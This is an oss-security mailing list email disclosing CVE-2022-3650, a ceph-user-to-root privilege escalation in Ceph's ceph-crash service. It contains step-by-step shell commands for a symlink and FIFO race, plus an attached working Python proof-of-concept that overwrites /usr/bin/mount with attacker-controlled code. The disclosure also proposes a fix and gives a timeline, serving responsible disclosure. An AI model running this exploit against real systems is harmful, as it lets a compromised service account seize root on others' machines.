Received: (qmail 19896 invoked by uid 550); 25 Oct 2022 10:00:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19858 invoked from network); 25 Oct 2022 10:00:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1666692017; h=from:from:sender:sender:reply-to:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type:list-id;
	bh=k0laQ6U+8th+opoEqnYEkGZyx2rA8R2wV/rpmuvfYeE=;
	b=Scixb2MPGBvCZrBN6K6YX4ldSUHNZ97cc8siFWqiZXJvcLEPA/OrixJxrLZo3Kz7k5ru9j
	hl+PiB522wyCRmEFtJWwk6z0qhRyxAkXeOrGMxoy5BqGcy+xA7XBorFgvilELjfRMjVDJo
	zhomZ1N0q75yK0+VKl62VRZmfn+3VbA=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1666692017;
	h=from:from:sender:sender:reply-to:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type:list-id;
	bh=k0laQ6U+8th+opoEqnYEkGZyx2rA8R2wV/rpmuvfYeE=;
	b=My3L02N5q+clFxVgn0ABSSjAaLrf7lJbLUshBH8n+OBU8ZHJxH+/+hnykHaqZSzVO+dJn9
	gcqggyWNOYCcTXDg==
Date: Tue, 25 Oct 2022 12:00:11 +0200
From: Matthias Gerstner <mgerstner@suse.de>
Sender: security <security-bounces+mgerstner=suse.de@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Y1ezsE38FrprBc6m@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="N20NZ9rdtp49vSgS"
Content-Disposition: inline
Subject: [oss-security] ceph: ceph-crash.service allows local ceph user to root exploit
 (CVE-2022-3650)

--N20NZ9rdtp49vSgS
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="z076DBavZChM7jQZ"
Content-Disposition: inline
Date: Tue, 25 Oct 2022 12:00:11 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: ceph: ceph-crash.service allows local ceph user to root exploit
 (CVE-2022-3650)


--z076DBavZChM7jQZ
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this report is about a ceph user to root privilege escalation in the
ceph-crash systemd service which is part of the ceph-base component of
the Ceph distributed storage system project [1]. This report relates to
Ceph version 16.2.9.

The Vulnerability
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The ceph-crash.service [2] runs the ceph-crash Python script [3] as
root. The script is operating in the directory /var/lib/ceph/crash which
is controlled by the unprivileged ceph user (ceph:ceph mode 0750). The
script periodically scans for new crash directories and forwards the
content via `ceph crash post`. This constellation is subject to security
issues that can allow the ceph user to either:

1) post arbitrary data as a "crash dump", even content from private
   files owned by root. The consequences of this are not fully clear to me,
   it could be an information leak if the security domain of "root" on the
   system is different to the security domain of wherever the ceph-crash
   data will be sent to / accessible afterwards. The `ceph crash post`
   command expects JSON input, however, thus the degree of freedom for
   this is reduced.

2) cause a denial-of-service by feeding large amounts of data into the
   `ceph crash post` process. This can cause high amounts of memory and CPU
   consumption. By placing a symlink or FIFO into the directory instead of
   an actual file, the script can be made to read from a device file
   like /dev/random or to block forever.

3) cause a local ceph to root user privilege escalation by tricking
   ceph-crash to move a ceph controlled file into a privileged file system
   location.

Item 3) is the most critical of these possibilities. The ceph-crash
script basically does the following at a regular interval (by default
every 10 minutes):

a) it iterates over all sub-directories of /var/lib/ceph/crash
   and for each sub-directory it does the following:
  b) it checks whether <crash>/meta is a regular file; if not then the
     dir is skipped.
  c) it checks whether <crash>/done is a regular file; if not then it
     sleeps for one second and checks again; if still not then the dir
     is skipped.
  d) it feeds the content of <crash>/meta to stdin of the command line
         timeout 30 ceph -n <auth> crash post -i -
  e) only if the crash post succeeded (exit code 0) will the script
     attempt to perform
         os.rename("/var/lib/ceph/crash/<crash>",
		 "/var/lib/ceph/crash/posted/<crash>")

The sleep of one second in step c) makes it easier winning the involved
race condition. A possible approach for a compromised ceph user account
for exploiting this is the following:

- create a fake crash directory named 'mount', containing an empty
  'meta' file:

  ceph$ mkdir /var/lib/ceph/crash/mount
  ceph$ touch /var/lib/ceph/crash/mount/meta

- wait for c) to happen i.e. ceph-crash sleeps for a second to wait for
  the "done" file to appear. This can be done in an event triggered
  fashion by using the inotify API to detect the service opening the
  crash directory. While ceph-crash is sleeping create the "done" file
  and replace "meta" by a FIFO:

  ceph$ touch /var/lib/ceph/crash/mount/done
  ceph$ rm /var/lib/ceph/crash/mount/meta
  ceph$ mkfifo /var/lib/ceph/crash/mount/meta

  On success the "ceph-crash" script, upon returning from the one second
  sleep, will block on the FIFO until the attacker is writing data into
  it, giving the attacker enough time to stage the rest of the attack
  (30 seconds, because of the `timeout` frontend command used in step
  d).

- while ceph-crash is busy forwarding data to `ceph crash post` the ceph
  user can replace the "mount" directory by a regular file and prepare a
  symlink attack:

  ceph$ mv /var/lib/ceph/crash/mount /var/lib/ceph/crash/oldmount
  ceph$ echo 'echo evil code' >/var/lib/ceph/crash/mount
  ceph$ chmod 755 /var/lib/ceph/crash/mount
  ceph$ mv /var/lib/ceph/crash/posted /var/lib/ceph/crash/posted.old
  ceph$ ln -s /usr/bin /var/lib/ceph/crash/posted
  # unblock the ceph-crash script
  ceph$ echo "$FAKE_JSON_DATA" >/var/lib/ceph/crash/oldmount/meta

If this succeeds in time then during step e) the ceph-crash script will
rename the ceph controlled "mount" file to /usr/bin/mount, thereby
replacing the system binary "mount" by the ceph controlled script. Any
root process invoking this is then executing exploit code. Any other
binary could be used for this, or also configuration files in /etc that
could allow to crack the system.

Because /var/lib/ceph/crash is not world-writable and has no sticky bit,
the Linux kernel's symlink protection is not coming to the rescue in
this constellation. A precondition is, however, that the file system
/var/lib/ceph is the same file system as the target directory for the
`rename()`, because `rename()` does not work across file system
boundaries. For many default Linux setups this is the case though.

Reproducer
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Attached to this e-mail is a proof of concept exploit script that
demonstrates the vulnerability. Running the script with ceph:ceph
credentials pretty reliably replaces /usr/bin/mount by a ceph controlled
script. Since ceph-crash only executes its routine every 10 minutes it
can take a bit of time to succeed if the race is not won, but it is
well within reach to succeed in a real world scenario.

I did not test this in a real world Ceph setup. For testing purposes I
let the invocation of "ceph crash post" always succeed. From reading the
Python code executed by "ceph crash post" I believe that the JSON data I
use in the exploit script should be accepted and lead to a zero exit
code.

Possible Fix
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

To fix the issue the simplest route I see would be to execute the
ceph-crash script also as ceph:ceph. If this is not possible for some
reason though then a careful selection of system calls and/or temporary
privilege drops will be necessary in the ceph-crash script to avoid any
symlink attacks and other race conditions on file system level.

The systemd service, the ceph-crash script and also the directory
permissions for /var/lib/ceph/crash are not specific to SUSE packaging
but are already found in the upstream sources. Also Fedora Linux ships
with the same setup, for example.

I reported this finding to the Ceph security mailing list a while ago.
Red Hat assigned the CVE for the issue. I did not get a confirmation
from their side yet whether the issue could be reproduced with a real
world Ceph setup. I also didn't hear about upstream's plans and schedule
for an actual bugfix.

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2022-09-22: I reported the vulnerability to security@ceph.io suggesting
            an embargo period of 14 days.
2022-10-10: I provided some additional information to security@ceph.io
	    suggested two more weeks of embargo, because I wasn't
	    available for some time and things didn't progress much.
2022-10-21: I inquired security@ceph.io about the state of their
	    analysis and bugfixing. I received the CVE for the issue.
	    They suffers some delays in handling the issue but we agreed
	    to publish the full report today anyway.

[1]: https://github.com/ceph/ceph
[2]: https://github.com/ceph/ceph/blob/85454b3262ef887aacb8f54f23646d6f163d=
f2ee/systemd/ceph-crash.service.in
[3]: https://github.com/ceph/ceph/blob/85454b3262ef887aacb8f54f23646d6f163d=
f2ee/src/ceph-crash.in

Best Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moer=
man

--z076DBavZChM7jQZ
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="ceph_crash_exploit.py"

#!/usr/bin/python3
import os
import shutil
import subprocess
import time

# Matthias Gerstner <matthias.gerstner@suse.com>
#
# This demonstrates a ceph user to root exploit when the "ceph-crash.service"
# from ceph-base version 16.2.9.538 is running on the system. "ceph-crash"
# runs /usr/bin/ceph-crash as root, a Python script, that looks for fresh
# crash directories in /var/lib/ceph/crash and posts them via "ceph crash
# post".
#
# /var/lib/ceph/crash is owned by ceph:ceph mode 750, this allows the ceph
# user to stage a symlink attack that can lead to a local root exploit.
#
# this exploit should be run with ceph:ceph credentials e.g.:
#
# root# sudo -u ceph -g ceph python3 /path/to/exploit.py
#
# prerequisites:
#
# - the file system where /var/lib/ceph resides on and the file system where a
#   system binary should be overwriten (e.g. /usr/bin) need to be the same,
#   otherwise the rename() system call for the exploit will fail.
# - the call to "ceph crash post" needs to succeed i.e. ceph must be running
#   and be correctly configured for this to work.
# - the ceph-crash.service needs to be running, of course

def touch(path):
    with open(path, 'w') as _:
        pass

def rmtree(path):
    try:
        shutil.rmtree(path)
    except FileNotFoundError:
        pass
    except NotADirectoryError:
        os.remove(path)

# the name of the fake crash we're creating. This needs to be the basename of
# a program in /usr/bin you want to replace by something controlled by the
# "ceph" user.
CRASH_NAME="mount"
# the "meta" file needs to contain valid JSON metadata for the "ceph crash post"
# command to succeed.
FAKE_META = """{
    "crash_id": "someid",
    "timestamp": 0
}"""

os.chdir("/var/lib/ceph/crash")

# the "posted" directory needs to exist otherwise ceph-crash won't start it's
# normal routine
if os.path.islink("./posted"):
    os.remove("./posted")

if not os.path.isdir("./posted"):
    os.mkdir("./posted")

# remove traces from previous exploit attempts
rmtree(f"./{CRASH_NAME}")
rmtree(f"./{CRASH_NAME}.old")

# stage a fake crash directory for ceph-crash to look into
os.mkdir(f"./{CRASH_NAME}")
os.chdir(f"./{CRASH_NAME}")
# this causes ceph-crash to wait for the "done" file for one second
touch("meta")

# wait for ceph-crash to start cycling through the crash directories
subprocess.check_call(["inotifywait", "../"])

# this is the major race that needs to be won: ceph-crash needs to see the
# regular "meta" file, but *not* see the "done" file, causing it to sleep for
# a second.
# Sleeping a bit ourselves helps for ceph-crash to actually see the regular
# "meta" file before we replace it with a FIFO
time.sleep(0.2)

# replace the regular file by a FIFO which will give us a larger time window
# while ceph-crash attempts to open the FIFO later on, blocking on it
os.remove("meta")
os.mkfifo("meta")
# now we're "done", ceph-crash will open the meta file which is by now a FIFO
touch("done")

print("done")

# replace the posted dir by a symlink into a directory where we want our
# exploit file to be moved to
rmtree("../posted")
os.symlink("/usr/bin", "../posted")

# wait some time for ceph-crash to actually see the "done" file
time.sleep(2)

# replace the crash directory by an exploit script
os.chdir("..")
os.rename(f"{CRASH_NAME}", f"{CRASH_NAME}.old")
with open(f"./{CRASH_NAME}", 'w') as exploit:
    # just some demo code
    exploit.write("#!/bin/bash\necho evil code\n")
# make it executable
os.chmod(f"./{CRASH_NAME}", 0o755)

# unblock ceph-crash to move our exploit script into "/usr/bin"
with open(f"./{CRASH_NAME}.old/meta", 'w') as meta:
    meta.write(FAKE_META)

--z076DBavZChM7jQZ--

--N20NZ9rdtp49vSgS
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmNXs6wACgkQFMQFyXGS
NVP9FxAAoqr4rXiWqkkK6rcSGFhRfzGXNO4Mu+4/5Bs8isQ9J+EK6NdgtpSJxEzi
Eq9wLlEWpsgN6cPR434HPVRJO79R5ZNJvaJcR29P/8nGNWYXcDCGHgaR6TSmGcDf
YVA1SsSTGmHMF0hdEumdZfOCp1OVulRTgeBZzuNcBYUjutv5ldX3Mey4fX0NxMIA
iojmx0yzwtNTZaSKnpgeDeWSBH8gPkYDp5xF7VBFKi2T9rviOZ+WDqwQhXJ0MmIK
Lrm19pR2EqZEYXQ/yxMPexiCOFcxqS7lqaAppATlGan9X22TVLbL6WQI17pnmSaO
7i8S9mxd4O7tlwNZAO6CbOOx13xdSKA6KR2LdqWryFOlft4UEMsYvtLqa1yYVc+8
TLlSZ2rgW6dSLZAIoc0qe1AVOdCzjoz6ZhUAVA786Nbhu9fh1TJEjI9nY5A/6wsS
ntbwTiytvb6r9gjVhjwslgiebl6BzrHf8q3oMq89nD+Q3IIJicMm3Gu/jRvpvWCE
koPe0cXgUKQx0BlTku/TC2X2Re23POximYji0mHrn1DzyCQLE9zF3RaSBW8Fmy5J
Hjw1Rw3wN7s+GG83+4A5YJFIeJ4/+d+5R6R659Y1rDPPvlDjQXN44YmditAMgNvu
a2RoI/9IJP9ULtvfKHSjh0tWzCNfaBLFjCQBqIBU2kDr+Kwt4C8=
=LqSw
-----END PGP SIGNATURE-----

--N20NZ9rdtp49vSgS--
